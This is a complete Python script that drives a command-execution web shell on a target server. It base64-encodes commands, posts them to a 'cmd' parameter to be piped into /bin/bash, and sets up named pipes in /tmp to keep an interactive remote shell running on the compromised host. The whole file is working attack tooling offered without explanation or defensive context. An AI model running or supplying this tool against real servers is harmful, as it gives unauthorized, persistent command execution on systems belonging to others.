#!/usr/bin/python3

import requests
import re
from bs4 import BeautifulSoup
import time
from base64 import b64encode
import random
import string
import sys

url = sys.argv[1]

def RunCmd(cmd, timeout=None):
	cmd = b64encode(cmd.encode()).decode()
	data = {"cmd": f"echo {cmd}|base64 -d | /bin/bash"}
	r = requests.post(url, data=data, timeout=timeout)
	soup = BeautifulSoup(r.content, "lxml")
	output = soup.find("pre").text.strip()
	return output
	
def WriteCmd(cmd):
	cmd = cmd.encode()
	cmd = b64encode(cmd).decode()
	data = {"cmd": f"echo {cmd}|base64 -d > {stdin}"}
	r = requests.post(url, data=data)
	soup = BeautifulSoup(r.content, "lxml")
	output = soup.find("pre").text.strip()
	return output
	
	
def rand_string():
	return "".join(random.choice(string.ascii_lowercase) for i in range(10))

def ReadCmd():
	GetOutput = f"/bin/cat {stdout}"
	output = RunCmd(GetOutput)
	return output
	
def SetupShell():
	NamedPipes = f"mkfifo {stdin}; tail -f {stdin} | /bin/bash 2>&1 > {stdout}"
	try:
		RunCmd(NamedPipes, 1)
	except Exception:
		pass
			
randstr = rand_string()
stdin = f"/tmp/input.{randstr}"
stdout = f"/tmp/output.{randstr}"
prompt = "$"

SetupShell()

while True:
	strip = False
	cmd = input(f"{prompt} ")
	if cmd == "quit" or cmd == "exit" or cmd == "quit()" or cmd == "exit()":
		sys.exit()
	WriteCmd(cmd + "\n")
	cmdoutput = ReadCmd()
	RunCmd(f"echo '' > {stdout}")
	if cmdoutput:
		if "$" in cmdoutput:
			pattern = r".*@.*:/.*\$"
			search_result = re.search(pattern, cmdoutput)
			if search_result:
				prompt = search_result.group(0)
				cmdoutput = cmdoutput.replace(prompt, "")
				strip = True
				if cmdoutput.count("\n") > 1:
					temp = fr"^{cmd}.*\n"
					cmdoutput = re.sub(temp, "", cmdoutput, count=1)
		if strip:
			print(cmdoutput)
		else:
			print(cmdoutput + "\n")
	else:
		print()
	
	
